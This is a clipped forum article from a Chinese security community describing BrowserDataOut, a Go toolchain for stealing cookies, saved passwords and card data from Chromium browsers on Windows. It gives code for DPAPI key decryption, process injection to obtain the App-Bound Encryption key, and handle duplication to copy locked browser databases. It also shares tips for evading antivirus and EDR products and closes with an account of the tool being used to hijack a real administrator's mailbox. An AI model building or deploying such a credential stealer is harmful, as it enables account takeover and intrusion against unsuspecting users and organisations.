---
title: 【先知】针对浏览器Cookie和密码提取的免杀研究
source: https://xz.aliyun.com/news/92813
source_host: xz.aliyun.com
clip_date: 2026-09-11T14:18:45+08:00
trace_id: 73ed78ba-ffd0-49d1-900b-6c623696da88
content_hash: af66dc6ecec38b270d98beaf935e2fa575ee10112e876a20b368dd7335b4c200
status: synced
tags:
  - 先知
  - Windows逆向
  - 安全工具
series: null
feed_source: 先知安全技术社区
ai_summary: "**TL;DR：** BrowserDataOut 用三个 Go 工具解耦实现 Chromium 系浏览器 Cookie/密码提取：密钥采集、锁定文件复制、离线解密，可在多款杀软与 EDR 下作业。"
ai_summary_style: key-points
images_status:
  total: 7
  succeeded: 7
  failed_urls: []
notion_page_id: 3d875244-d011-817a-a28b-cb6e7618c59c
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> **TL;DR：** BrowserDataOut 用三个 Go 工具解耦实现 Chromium 系浏览器 Cookie/密码提取：密钥采集、锁定文件复制、离线解密，可在多款杀软与 EDR 下作业。
> 
> - **三件套分工：** BrowserKeysDump 导出 v10/v20 主密钥为 keys.json；BrowserDataCopy 复制被独占锁定的 Cookies、Login Data；BrowserDataRestore 离线解密，密钥与数据同源即可在任意机器还原。
> - **v20 难点：** Chrome 127+ 的 App-Bound Encryption 只能由浏览器进程内 IElevator 解密，故用挂起进程注入 + 远程线程 + RWX 内存执行 payload，回读 scratch 区 32 字节主密钥；该步最易被强力 EDR 告警。
> - **绕锁技巧：** NtQuerySystemInformation 枚举全系统句柄 → DuplicateHandle 复制浏览器持有的句柄 → CreateFileMapping/MapViewOfFile 分页读取，避免 ReadFile 挪动共享文件指针；WAL 模式需连带复制 -wal/-shm。
> - **解密逻辑：** 按 v10/v11/v20 三字节前缀分发 AES-256-GCM 或 AES-128-CBC，纯标准库解析 SQLite，输出 password、cookie、history、download、bookmark、creditcard、extension 七类 JSON。
> - **免杀经验：** 注入加随机延迟与进程树拟真；文件映射读取比 ReadFile 温和；解密模块单独拆分，因杀软对解密动作查杀较严。

**本文首发于国家网络空间安全云社区，作者AabyssZG**

## 1# 概述

在实战攻防对抗的过程中，面对的不仅仅只有服务器，还有内网海量的个人主机。而浏览器又作为个人主机重要的日常工作、运维以及娱乐的软件，保存了许多重要网站凭据（如堡垒机、云管理平台、企业面板、OA后台等）。

在实际内网渗透过程中，拿到个人主机的权限（如钓鱼、域控下发）后，个人主机大部分还无法操控鼠标（无RDP服务且会引发目标警觉）以及安装终端防护软件，如何无痕实现针对浏览器中保存的Cookie和账户密码的提取和还原，便成为内网渗透必不可少的一环。

最近就有一个黑暗大门的群友找到我，表示最近在内网渗透过程中，有个重要的凭据存在运维的浏览器中，而目标账号密码又有2FA验证，只能提取Cookie尝试，而该机器上面又安装了EDR，尝试寻找并魔改了一些开源项目都被EDR拦截，想要找我来实现这一个目的。

接到这一个需求后，我自己也在逐步摸索，最终我通过Golang搞定了： **BrowserDataOut** 是一套面向 Chromium 系浏览器（Chrome、Edge、Brave、Opera、360、QQ 等）数据取证/恢复的 Windows 工具链，由三个独立可编译的 Go 项目组成。

|     |     |     |
| --- | --- | --- |  
| 项目  | 角色  | 一句话说明 |
| `BrowserKeysDump` | 采集密钥 | 在目标机器上导出浏览器主密钥（v10/v20）为 `keys.json` |
| `BrowserDataCopy` | 采集数据 | 浏览器运行期间复制被独占锁定的 `Cookies` 、 `Login Data` 等关键文件 |
| `BrowserDataRestore` | 离线解密 | 用 `keys.json` 在任意机器上解密复制的数据，输出分类 JSON |

**本项目已经提供给不少群友用作测试，目前已经能够稳定在多个杀软和EDR环境下开展作业，如360、火绒、深信服EDR等等。**

三个项目 **解耦、可独立运行**，通过统一的数据格式（ `keys.json` + archive 目录布局）无缝衔接，形成一条完整链路：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/9ea2c8318fecb0a6.jpg)

核心思想是 **"密钥与数据分离采集，解密在任意机器完成"**：

1.  密钥（v10 DPAPI / v20 ABE）都绑定在原机器上，必须在原机器导出；
2.  数据文件（SQLite / JSON）可能被运行中的浏览器独占锁定，需要用特殊手段复制出来；
3.  解密只依赖"密钥 + 数据"，两者同源即可在分析机离线完成。

本项目工具涉及的技术栈如下：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d42232ea0a494355.png)

**注：本文为笔者在实战过程中写出的随笔，部分思维导图和技术结论出自Kimi大模型，如有错误或者疏漏，欢迎各位师傅指正！**

## 2# BrowserKeysDump：如何拿到密钥

以Chromium为内核的浏览器会把 Cookie、密码、支付信息等敏感数据写入本地SQLite文件（如 `Cookies` 、 `Login Data` ），在这些SQLite文件的 `encrypted_value` 字段前，会加 3 字节前缀 `v10` 或 `v20` ，表示后面这段密文是用哪套 os_crypt 方案加密的。

真正的密钥则放在用户数据目录下的 `Local State` （JSON 文件）的 `os_crypt` 字段里：

-   v10 → `os_crypt.encrypted_key`
-   v20 → `os_crypt.app_bound_encrypted_key` （以 `APPB` 开头）

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d52f583636467d3c.png)

Chrome 80 之后全面转向 v10，Chrome 127（2024 年 7 月）起在 Windows 上引入 v20，即 **App-Bound Encryption（应用绑定加密）**。

v10/v11/v20密钥的区别如下：

|     |     |     |     |     |
| --- | --- | --- | --- | --- |    
| 版本  | 载体  | 加密算法 | 绑定范围 | 用途  |
| `v10` | `Local State` 中 `os_crypt.encrypted_key` ，前缀 `DPAPI` | DPAPI（Windows 用户密钥） | Windows 用户/机器 | 密码、Chrome <127 的 Cookie |
| `v11` | Linux 下 keyring 派生 | AES-128-CBC | Linux 用户会话 | Linux 密码（本工具为 Windows 专用，不处理） |
| `v20` | `Local State` 中 `os_crypt.app_bound_encrypted_key` ，前缀 `APPB` | App-Bound Encryption（浏览器进程内 `IElevator` COM 解密） | 浏览器安装（Chrome 127+） | Chrome/Edge 127+ 的 Cookie |

浏览器把加密字段以统一格式存储：

### 2.1 v10密钥：DPAPI 解密

**数据层**：统一是 AES-256-GCM（AEAD），密文布局为 `v10 ‖ 12字节nonce ‖ 密文+16字节GCM校验tag` ，base64 后入库。

**密钥层** （各平台不同）：

-   **Windows**： `encrypted_key` 是 base64("DPAPI" + DPAPI加密后的32字节随机key)，用当前用户的 `CryptUnprotectData` 解出主密钥。
-   **macOS**：主密钥存在 Keychain 的 "Chrome Safe Storage" 条目里。
-   **Linux**：优先走 GNOME Keyring / KWallet，取不到时回退到固定参数：口令 `"peanuts"` + 盐 `"saltysalt"` ，PBKDF2-HMAC-SHA1 迭代 1 次派生 16 字节 key，用 **AES-128-CBC** 加密（这是 v10 在 Linux 上的特殊之处）。

**漏洞本质**：DPAPI 只把数据绑定到"机器 + 用户"， **不区分同用户下的进程**——任何以你身份运行的程序都能调 `CryptUnprotectData` 把 key 解出来，这也是各种 cookie 窃取工具的惯用路径。

Chromium 把主密钥放在 `Local State` 的 `os_crypt.encrypted_key` 中，外层由 Windows DPAPI 保护：

```go
// 去掉 "DPAPI" 前缀后交给 Windows CryptUnprotectData 解密
func decryptDPAPI(ciphertext []byte) ([]byte, error) {
    var out dataBlob
    r, _, err := procCryptUnprotectData.Call(
        uintptr(unsafe.Pointer(newBlob(ciphertext))),
        0, 0, 0, 0, 0,
        uintptr(unsafe.Pointer(&out)),
    )
    if r == 0 {
        return nil, fmt.Errorf("CryptUnprotectData: %w", err)
    }
    defer procLocalFree.Call(uintptr(unsafe.Pointer(out.pbData)))
    return out.bytes(), nil
}
```

-   结果是一个 **32 字节 AES-256 主密钥**；
-   DPAPI 由当前 Windows 用户主密钥解密， **换机器/换用户即失效**——这正是密钥必须在目标机器导出的原因。

### 2.2 v20密钥：App-Bound Encryption 与反射式注入

v20 的数据体仍然是 AES-256-GCM， **变化在密钥的获取链条**：

1.  从 `Local State` 取出 `app_bound_encrypted_key` ，去掉 `APPB` 头；
2.  先用 **SYSTEM 权限的 DPAPI** 解一层（这一层由 SYSTEM 身份运行的 Google Update 提升服务完成，并用 chrome.exe 路径哈希作为 entropy，把密钥"焊死"在官方安装路径上），再用 **当前用户DPAPI** 解第二层；
3.  解出的尾部结构为 `[Chrome安装路径][1字节flag][12B IV][32B 密文][16B tag]` ，按 flag 选算法再解一刀，得到最终 32 字节主密钥：

-   flag=1：AES-256-GCM，key 硬编码在 `elevation_service.exe` ；
-   flag=2：ChaCha20-Poly1305，同样硬编码；
-   flag=3（v137+）：用 CNG 里的 `"Google Chromekey1"` 解出后 XOR 硬编码常量；

1.  拿到主密钥后，解密 cookie 本体与 v10 完全相同。

Chrome 127+ 的 Cookie 使用 ABE： `app_bound_encrypted_key` ，只能由 **浏览器进程内** 的 `IElevator` COM 服务解密。工具的做法是把自己的 payload 注入浏览器进程代劳：

```go
func injectPayload(exePath string, payload []byte, env map[string]string) ([]byte, error) {
    // 1. 解析 payload 的 PE 导出表，定位 Bootstrap 函数偏移
    loaderRVA, _ := findExportFileOffset(payload, "Bootstrap")

    // 2. 预填 payload 的导入地址槽（LoadLibraryA/GetProcAddress/VirtualAlloc/...）
    writeAddr(impLoadLibraryAOffset, addrLoadLibraryA())
    writeAddr(impGetProcAddressOffset, addrGetProcAddress())
    // ...

    // 3. 以挂起方式启动浏览器（临时 --user-data-dir 隔离）
    pi, _, _ := spawnSuspended(exePath)

    // 4. 把 payload 写入浏览器进程内存（RWX）
    remoteBase, _ := writeRemotePayload(pi.Process, patched)

    // 5. 恢复主线程，等待初始化后远程执行 Bootstrap
    windows.ResumeThread(pi.Thread)
    time.Sleep(500 * time.Millisecond)
    runAndWait(pi.Process, remoteBase, loaderRVA, defaultWait)

    // 6. 从 scratch 区读回 32 字节主密钥
    result, _ := readScratch(pi.Process, remoteBase)
    return result.Key, nil
}
```

payload 与注入器的"通信协议"是 payload 镜像开头的 scratch 区：

```latex
偏移     字段
0x28     marker
0x29     status (0x1 = keyStatusReady)
0x2a     errCode
0x2c     hResult (COM)
0x30     comErr
0x40     32 字节主密钥
```

`readScratch` 一次 `ReadProcessMemory` 读 56 字节（ `0x28` → `0x60` ）即可拿到状态与密钥。

### 2.3 ABE 注入深度细节

**payload 导入地址槽（编译期约定，注入前预填）**：

|     |     |
| --- | --- | 
| 偏移  | 槽位  |
| `0x40` | `LoadLibraryA` |
| `0x48` | `GetProcAddress` |
| `0x50` | `VirtualAlloc` |
| `0x58` | `VirtualProtect` |
| `0x60` | `NtFlushInstructionCache` |

注入器在本进程用 `kernel32` / `ntdll` 的 `LazyProc.Addr()` 解析这些 API 的真实地址，写入 payload 镜像后再 `WriteProcessMemory` ，这样 payload 进入远程进程后无需系统加载器即可调用。

**payload 错误码与 HRESULT 对照**：

```latex
errCode: 0x1 basename 提取失败    0x2 浏览器不在 com_iid 表
         0x3 环境变量缺失/超长     0x4 base64 解码失败
         0x5 SysAllocString 失败  0x6 CoCreateInstance 失败
         0x7 IElevator.DecryptData 失败  0x8 密钥长度 != 32

hResult: 0x80004002 E_NOINTERFACE        0x80010108 RPC_E_DISCONNECTED
         0x80040154 REGDB_E_CLASSNOTREG  0x80070005 E_ACCESSDENIED
         0x800706BA RPC_S_SERVER_UNAVAILABLE
```

**进程生命周期管理**：

-   `spawnSuspended` ：命令行 `"<exe>" --user-data-dir="<临时目录>"` ， `CREATE_SUSPENDED` 启动，用临时 `User Data` 避免污染真实配置；
-   注入 `RWX` 内存（ `MEM_COMMIT|MEM_RESERVE` + `PAGE_EXECUTE_READWRITE` ） **这是 EDR 最敏感的信号之一**；
-   恢复主线程后等 500 ms（让浏览器完成基础初始化），再 `CreateRemoteThread` 执行 `Bootstrap` ， `WaitForSingleObject` 默认 30 s；
-   等待超时且进程仍存活（ `STILL_ACTIVE=259` ）时，日志提示"目标存活，疑似 EDR/AV 拦截"；
-   结束后 `TerminateProcess` + 2 s 等待， `defer` 兜底清理远程进程与临时目录。

**PE 解析要点**：

-   `detectPEArch` ：读 `0x3c` 处 PE 签名偏移，校验 `PE\0\0` ，按 `machine` 字段区分 `0x8664` (amd64) / `0x014c` (386)，只接受 amd64；
-   `findExportFileOffset` ：PE32+ 可选头从 `peOff+24` 开始， `DataDirectory[0]` （导出表）在可选头偏移 112；遍历节表做 RVA→文件偏移；
-   一个隐蔽细节： `rva - sectVA + sectRaw` 必须 **保持 uint32 运算**——当 `rva < sectVA` 时靠 uint32 回绕得到正确结果，拆成 `int` 运算会得到天文数字。

## 3# BrowserDataCopy：如何复制被锁定的文件

以Chromium为内核的浏览器运行的时候，无法直接通过外部脚本或程序复制 `Cookies` 等浏览器数据文件，最核心的原因是对其本地数据库施加了 **独占式文件锁（Exclusive File Lock）**。

> 独占式进程锁（File Locking）：Chrome 的 Cookie 和历史记录等数据本质上是SQLite数据库。当浏览器启动时，它会作为主进程打开这些文件，并对文件施加 **独占锁**。此时，Windows、macOS 或 Linux 的操作系统底层会保护该文件，禁止其他进程进行读取、修改或复制（报错通常为 `PermissionError` 、文件被占用或无法复制）。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/21df24b1c6d9e801.png)

Chrome/Edge 用严格的共享模式打开 SQLite，外部进程 `CreateFile` 请求共享读写时被拒绝，报 `ERROR_SHARING_VIOLATION(32)` 。

### 3.1 两段式复制

先按常规方式复制，失败了再判断是不是锁定错误；如果是，就去找到浏览器 **已经打开的那个句柄**，把它"借"到当前进程来。

```go
func copyFileSmart(src, dst string) error {
    if err := copyNormal(src, dst); err == nil {
        return nil                          // 未锁定：普通复制
    } else if !isLockError(err) {
        return err                          // 非锁定错误：直接失败
    }

    // 锁定回退：把浏览器的文件句柄复制进当前进程
    h, err := findFileHandle(src)
    if err != nil {
        return err
    }
    defer windows.CloseHandle(h)

    data, err := readLockedFile(h)          // 文件映射读取
    if err != nil {
        return err
    }
    return os.WriteFile(dst, data, 0o600)
}
```

### 3.2 句柄复制（核心技巧）

复制的句柄与浏览器共享 **同一个 FILE_OBJECT**，浏览器能读，我们就能读：共享模式限制就此被绕开。

```go
// 1. NtQuerySystemInformation 枚举全系统句柄
handles, _ := querySystemHandles()

// 2. 找到持有目标文件的进程，把句柄复制到当前进程
for _, h := range handles {
    process, err := windows.OpenProcess(processDupHandle, false, uint32(h.UniqueProcessId))
    if err != nil { continue }
    windows.DuplicateHandle(process, windows.Handle(h.HandleValue),
        windows.CurrentProcess(), &dup, 0, false, duplicateSameAccess)
    // 3. 只保留磁盘文件句柄
    if ft, _ := windows.GetFileType(dup); ft != fileTypeDisk { continue }
    // 4. 用真实路径匹配目标文件
    name, _ := finalPathName(dup)
    if pathsMatch(name, targetNorm) { return dup, nil }
}
```

### 3.3 文件映射读取（不干扰浏览器）

不用 `ReadFile` 的原因：复制的句柄与浏览器 **共享文件指针**， `ReadFile` 会挪动指针、干扰浏览器；文件映射基于页读取，无副作用。

```go
mapping, _ := windows.CreateFileMapping(h, nil, pageReadonly, 0, 0, nil)
view, _     := windows.MapViewOfFile(mapping, fileMapRead, 0, 0, 0)
// RtlMoveMemory 直接以 uintptr 形式接收映射地址，避免挪动共享文件指针
procRtlMoveMemory.Call(uintptr(unsafe.Pointer(&data[0])), view, uintptr(size))
```

### 3.4 伴生文件

SQLite WAL 模式下最新数据在 `-wal` 里。工具对 `Cookies` 、 `Login Data` 、 `History` 、 `Web Data` 顺带复制 `-wal` / `-shm` ：

```latex
Network/Cookies → Network/Cookies + Network/Cookies-wal + Network/Cookies-shm
```

### 3.5 句柄枚举与路径匹配深度细节

`SYSTEM_HANDLE_INFORMATION` 内存布局（64 位）：

```latex
偏移 0      ULONG NumberOfHandles
偏移 4      4 字节对齐填充
偏移 8      句柄条目数组，每条 24 字节：

  0x00  UniqueProcessId       uint16
  0x02  CreatorBackTraceIndex uint16
  0x04  ObjectTypeIndex       uint8
  0x05  HandleAttributes      uint8
  0x06  HandleValue           uint16
  0x08  Object                uintptr
  0x10  GrantedAccess         uint32
```

-   枚举信息类 `SystemHandleInformation = 0x10` ；缓冲区从 4 MiB 起步，收到 `STATUS_INFO_LENGTH_MISMATCH(0xC0000004)` 时按系统返回的所需长度扩容重试，上限 512 MiB；
-   跳过 `pid == 0` （System Idle）和 `pid == 4` （System）以及 `HandleValue == 0` ；
-   `OpenProcess(PROCESS_DUP_HANDLE=0x40)` → `DuplicateHandle(..., DUPLICATE_SAME_ACCESS=0x2)` ；
-   `GetFileType` 必须等于 `FILE_TYPE_DISK(0x1)` ，排除管道、字符设备等。

**路径归一化规则**：

```latex
normalize:  / → \；去掉 \\?\、\??\、\\.\ 前缀；去尾部 \；转小写
pathsMatch: ① 全路径相等  ② 互为后缀  ③ stableSuffix 相等
stableSuffix: 从 \appdata\ / \programdata\ / \users\public\ 之后截取
```

用"锚点后缀"而非完整路径比较，是为了兼容 `GetFinalPathNameByHandle` 返回的 `\\?\` 前缀、盘符/大小写差异，以及某些句柄返回设备路径（ `\Device\HarddiskVolume...`）的情况。

**文件映射读取参数**：

```latex
CreateFileMapping: PAGE_READONLY(0x2)
MapViewOfFile:     FILE_MAP_READ(0x4)
RtlMoveMemory:     ntdll 导出，直接以 uintptr 形式接收映射地址
```

`GetFileSizeEx` 先取大小，超过 512 MiB 拒绝映射； `RtlMoveMemory` 把映射视图拷入 Go 切片——刻意绕开 `uintptr → unsafe.Pointer` 转换（ `go vet` 会报 unsafeptr），同时保证不移动浏览器共享的文件指针。

## 4# BrowserDataRestore：如何离线解密

本工具主要通过读取 `BrowserKeysDump` 导出的 `keys.json` ，配合从目标机器拷贝出来的浏览器数据（目录或 zip），在任意机器上还原出密码、Cookie、历史记录、书签等，并输出为按类别聚合的 JSON。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/16615357ba853026.png)

在"采集-恢复"链路中，本工具是 **恢复端**：

```latex
keys.json ─────────┐
                   ├──▶ BrowserDataRestore ──▶ password.json / cookie.json / ...
浏览器数据拷贝 ─────┘        (离线解密)            history.json / bookmark.json ...
```

特点：

-   **纯标准库**：不依赖外部库、SQLite 驱动、gjson 等任何第三方包；
-   **跨主机**：密钥以静态方式注入，解密不依赖目标机器的 DPAPI；
-   **支持 7 类数据**：password、cookie、history、download、bookmark、creditcard、extension；

### 4.1 密钥静态注入

`keys.json` 里的 base64 密钥直接解码为 `[]byte` ，恢复过程 **不再调用 DPAPI/ABE**：

```go
type MasterKeys struct {
    V10 []byte `json:"v10,omitempty"`
    V11 []byte `json:"v11,omitempty"`
    V20 []byte `json:"v20,omitempty"`
}
```

因此只要密钥与数据同源，在 **任意机器** 都能解密。

### 4.2 版本前缀分发解密

Chromium 加密字段统一为 `版本前缀(3B) + 密文` ：

```go
func decryptValue(mk MasterKeys, ciphertext []byte) ([]byte, error) {
    switch {
    case bytes.HasPrefix(ciphertext, []byte("v10")):
        if len(mk.V10) == 32 {
            return aesGCMDecrypt(mk.V10, ciphertext)  // Windows v10
        }
        return aesCBCDecrypt(mk.V10, ciphertext)      // macOS/Linux v10
    case bytes.HasPrefix(ciphertext, []byte("v11")):
        return aesCBCDecrypt(mk.V11, ciphertext)      // Linux v11
    case bytes.HasPrefix(ciphertext, []byte("v20")):
        return aesGCMDecrypt(mk.V20, ciphertext)      // Chrome 127+ ABE
    default:
        return ciphertext, nil                        // 老版本明文
    }
}

func aesGCMDecrypt(key, data []byte) ([]byte, error) {
    block, _ := aes.NewCipher(key)       // 32B key → AES-256
    aead, _  := cipher.NewGCM(block)     // NonceSize = 12
    return aead.Open(nil, data[3:15], data[15:], nil)
}
```

密钥与数据不匹配时， `aead.Open` 返回 `cipher: message authentication failed` ，工具会统计失败数并告警，而不是静默输出空值。

### 4.3 七类浏览器数据提取方法

|     |     |     |
| --- | --- | --- |  
| 类别  | 数据源 | 关键处理 |
| password | `Login Data` → `logins` | 解密 `password_value` |
| cookie | `Network/Cookies` （回退 `Cookies` ）→ `cookies` | 解密 + 剥离 `SHA256(host)` 前缀 |
| history | `History` → `urls` | 直接读取 |
| download | `History` → `downloads` | 直接读取 |
| bookmark | `Bookmarks` JSON | 递归遍历 `roots.*.children` |
| creditcard | `Web Data` → `credit_cards` | 解密 `card_number_encrypted` |
| extension | `Secure Preferences` | 解析 `extensions.settings` ，过滤系统组件 |

### 4.4 各类数据提取的精确列与排序

```latex
logins:      origin_url, username_value, password_value, date_created
cookies:     name, encrypted_value, host_key, path, creation_utc,
             expires_utc, is_secure, is_httponly, has_expires, is_persistent
urls:        url, title, visit_count, last_visit_time
downloads:   target_path, tab_url, total_bytes, start_time, end_time, mime_type
credit_cards: guid, name_on_card, expiration_month, expiration_year,
             card_number_encrypted, nickname, billing_address_id
```

排序策略：password/cookie 按 `CreatedAt` 降序，history 按 `VisitCount` 降序，download 按 `StartTime` 降序，bookmark 按 `CreatedAt` 降序。

时间转换：Chromium `base::Time` 是自 **1601-01-01 UTC 起的微秒数**：

```go
const chromiumEpochOffsetMicros int64 = 11644473600000000
t := time.UnixMicro(epoch - chromiumEpochOffsetMicros).UTC()
```

**扩展解析**：依次尝试 `extensions.settings` 、 `settings.extensions` 、 `settings.settings` 三个 JSON 路径；跳过 `location=5/10` 的系统组件；启用态优先看 `disable_reasons` （空数组=启用），否则回退 `state==1` 。

## 5# 针对免杀过程的一些经验分享

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/062ba58422cf661d.png)

在编写这个项目的过程中，也一步步去解决了工具免杀的一些问题：

-   在进程注入过程中，进行随机延迟/抖动、进程树与命令行拟真，避免"启动即注入即退出"的模式；
-   去复制被锁定的文件时，使用CreateFileMapping + MapViewOfFile 比 ReadFile 更加温和，不挪动文件指针，也不触发部分文件读 Hook；
-   刚开始觉得解密这个过程应该没有什么敏感点，结果发现解密的模块查杀是很严的，感觉杀软检测了很多解密动作，就把解密模块单独拉出来。

但目前尚未解决的问题还有一些，其中的 `BrowserKeysDump` 使用ABE 注入使用"挂起进程 + 远程线程 + RWX 内存"，是典型的进程注入技术， **部分强力EDR/杀软会告警**。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d2226a1c4f25bceb.png)

这个问题目前还没有很好的解决方法，如果有大佬有什么比较好的方法可以私聊一下我。

## 6# 总结

本项目在编写过程中，参考了许多优质的开源项目和文章，感谢以下作者的付出，链接列举如下：

**BrowserDataOut 的三个项目分别解决链路中的一个痛点和难点：**

|     |     |     |
| --- | --- | --- |  
| 项目  | 解决的痛点难点 | 关键技术 |
| BrowserKeysDump | 密钥被 DPAPI/ABE 双重保护，普通进程拿不到 | DPAPI 解密 + ABE 反射式注入 + PE 导出表解析 + `go:embed` |
| BrowserDataCopy | 运行中的浏览器独占锁定 SQLite，普通复制失败 | `NtQuerySystemInformation` 句柄枚举 + `DuplicateHandle` + 文件映射读取 |
| BrowserDataRestore | 解密必须依赖目标机器环境，且 SQLite 格式复杂 | 密钥静态注入 + 纯标准库 SQLite 只读解析 + AES-GCM/CBC 分发 |

目前为止，已经完全实现了黑暗大门群友的目的，他也成功通过Cookie导出目标运维邮箱的邮件，并拿到了重要凭据进入了后台，群友后面也给我包了一个大红包作为感谢，太高兴了哈哈~

也感谢各位师傅读到最后，祝你们生活愉快，有什么问题也可以多多交流。
